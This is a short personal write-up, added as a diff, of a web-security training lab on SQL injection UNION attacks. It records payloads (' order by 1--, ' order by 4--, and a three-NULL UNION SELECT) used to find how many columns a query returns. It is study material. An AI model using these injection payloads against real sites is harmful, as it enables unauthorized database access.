@@ -1,0 +1,16 @@
+Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+
+Determine how many columns
+
+
+lets try order by
+
+' order by 1-- okay
+
+' order by 4-- Error
+then 4 - 1 = 3 columns
+
+we know there is 3 columns then
+
+' UNION SELECT NULL , NULL , NULL-- okay complete
